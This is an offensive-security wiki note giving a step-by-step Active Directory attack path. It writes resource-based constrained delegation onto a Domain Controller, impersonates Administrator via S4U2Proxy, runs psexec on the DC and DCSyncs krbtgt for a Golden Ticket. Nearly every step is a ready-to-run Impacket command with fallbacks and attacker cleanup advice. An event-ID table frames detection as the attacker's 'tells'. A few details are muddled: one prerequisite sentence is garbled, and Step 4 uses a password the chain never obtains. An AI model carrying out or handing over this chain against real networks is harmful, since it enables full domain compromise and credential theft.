---
title: "Attack Path: RBCD on a Domain Controller → impersonate a Domain Admin on the DC → DCSync → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, rbcd, dcsync, privilege-escalation]
---

# Attack Path: RBCD on a DC → Impersonate a DA on the DC → DCSync → Domain Admin

The **RBCD-to-domain** chain: use **Resource-Based Constrained Delegation**
to write yourself onto a **Domain Controller**, then use **S4U2Proxy** to
**impersonate a Domain Admin on the DC's own `cifs`/`host` service**. That
gives you a **local-admin session on the DC as a Domain Admin** — from which
**DCSync** is one command and `krbtgt` is the durable end. This is the
"RBCD aimed at the DC" completion of the lateral RBCD chain in
[[path-mitm6-rbcd-to-local-admin]]; same primitive, the target is a DC instead
of a member server. See [[resource-based-constrained-delegation]] for the
attribute, [[s4u2self-s4u2proxy]] for the S4U primitives, and [[dcsync]] for
the endgame.

## Chain

```
You (a foothold + machine account quota, or a relay position)
  --create a computer account / get a machine acct--> EVIL$
  --write msDS-AllowedToActOnBehalfOfOtherIdentity (EVIL$) on the DC--> RBCD
  --getST.py -impersonate Administrator -spn cifs/DC--> TGS as Administrator to the DC
  --psexec.py -k to the DC--> local admin on the DC as Administrator
  --DCSync krbtgt--> Golden Ticket -> Domain Admin
```

## Prerequisites / what signals this path exists

- **Machine Account Quota > 0** (default 10) — you can create a computer
  account, **or** you have a machine account via [[rbcd-via-ntlm-relay]]
  (the credential-less relay), **or** an existing account with
  `GenericWrite`/`WriteDacl` on a DC. See [[resource-based-constrained-delegation]].
- A **DC** you can target (you'll write RBCD *on the DC object*).
- An **SPN on the DC** to impersonate to — the DC's `cifs/DC` or `host/DC`
  (its machine-account SPN). You need the DC's **SID** and **machine
  account's secret** is *not* needed (RBCD is resource-based — the *target*
  writes, you just need the *source* machine account).

```powershell
# Confirm MAQ / your computer account + the DC's SPN + SID
Get-DomainComputer -Properties dnshostname            # pick the DC
# the DC's machine SPN: cifs/DC01.corp.local, host/DC01.corp.local
# you need the DC's objectSID (S-1-5-21-...-11xx) for getST
```
**Verify:** you can create a computer account (MAQ) *or* you have a relay
position, and you know the target DC's objectSID. If MAQ is 0 and you have no
relay, you need an ACL edge (`WriteDacl`/`GenericAll`) on the DC instead — see
[[acl-abuse]].

## Step 1 — Get a machine account and write RBCD on the DC

```bash
# Create a computer account (or use one from a relay)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' corp.local/<you>

# Write RBCD: EVIL$ may act on behalf of others to cifs/DC01 (the DC)
rbcd.py -delegate-from 'EVIL$' -delegate-to 'DC01$' -action write corp.local/<you>
# (or: ntlmrelayx.py / mitm6 for the credential-less variant — see rbcd-via-ntlm-relay)
```
**Verify:** the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` now lists
`EVIL$`. See [[resource-based-constrained-delegation]].

### Failure modes & fallbacks
- **MAQ is 0** — no computer-account creation; fall back to the
  **credential-less relay** ([[rbcd-via-ntlm-relay]], [[mitm6-ipv6-relay]]) or
  an ACL edge (`WriteDacl` on the DC).
- **DC's SPN not writable / filtered** — target the DC's `host/` SPN instead
  of `cifs/`; some hardening blocks `cifs` RBCD.

## Step 2 — Impersonate a Domain Admin on the DC (S4U2Proxy)

With `EVIL$`'s password and the DC's objectSID, mint a TGS that
**impersonates a DA** to the DC's service:

```bash
getST.py -spn cifs/DC01.corp.local -impersonate Administrator \
  -dc-ip <dc> 'corp.local/EVIL$:Passw0rd!'
# -> TGT-...Administrator.ccache (a TGS as Administrator to cifs/DC01)
```
**Verify:** a ccache holding a TGS for **`Administrator` → `cifs/DC01`**. See
[[s4u2self-s4u2proxy]], [[tgt-tgs]].

### Failure modes & fallbacks
- **`getST.py` fails (no RBCD on that SPN)** — confirm the attribute is on the
  DC and matches `EVIL$`; try the `host/DC01` SPN.
- **Wrong DC objectSID** — the impersonated ticket's PAC won't validate;
  re-pull the DC's `objectSID`.

## Step 3 — Land on the DC as a Domain Admin

```bash
export KRB5CCNAME=TGT-...Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local   # -> local admin on the DC
whoami /all
```
**Verify:** `whoami /all` = `corp.local\administrator` **on the DC** (local
admin + you're on Tier 0). See [[remote-execution]], [[smb]].

### Failure modes & fallbacks
- **The DC rejects `cifs` exec** — use WMI/WinRM with the same TGS
  ([[remote-execution]]), or target the `host/` SPN.
- **You're DA-on-a-DC but it's a read-only DC** — move to a writable DC (PDC
  emulator) for the DCSync.

## Step 4 — DCSync → domain dominance

```bash
secretsdump.py -dc-ip <dc> corp.local/Administrator:<pass> -just-dc-user krbtgt
# (you're a DA on the DC — DCSync krbtgt directly)
```
Then Golden Ticket. See [[dcsync]], [[golden-silver-tickets]], [[krbtgt]].
**Verify:** `krbtgt` `aes256-cts-hmac-sha1-96` in the output.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1 (RBCD) | a **new computer account** + a write to the DC's `msDS-AllowedToActOn...` | MAQ use + RBCD on a DC |
| 2 (S4U) | **4769** where **client ≠ service account** (Administrator's TGS via `EVIL$`) | the impersonation tell |
| 3 (lateral) | **4624** for Administrator on the DC | a DA on Tier 0 |
| 4 (DCSync) | **4662** on the domain object (GetChanges+GetChangesAll) | `Administrator` replicating |

## Cleanup notes
- The **RBCD attribute on the DC** is durable — remove it if you wrote it
  (re-run `rbcd.py -action delete`) or it's a standing backdoor.
- The **new computer account** (`EVIL$`) is a durable object — delete it.
- The **4769 (client≠service)** and **DCSync 4662** are the domain-wide
  tells. If caught, expect `krbtgt` rotation ([[krbtgt]]).

## Related
- [[path-mitm6-rbcd-to-local-admin]] — the same primitive aimed at a member server (lateral)
- [[rbcd-via-ntlm-relay]] — the credential-less way to get the RBCD write (step 1)
- [[resource-based-constrained-delegation]] — the attribute
- [[s4u2self-s4u2proxy]] — the S4U primitives (step 2)
- [[dcsync]], [[golden-silver-tickets]], [[krbtgt]] — step 4
- [[tgt-tgs]] — the TGS you forge
- [[remote-execution]], [[smb]] — step 3 exec
- [[service-account]] — the machine account you create
- [[ad-tier-model]] — step 3 is the Tier 1→Tier 0 jump
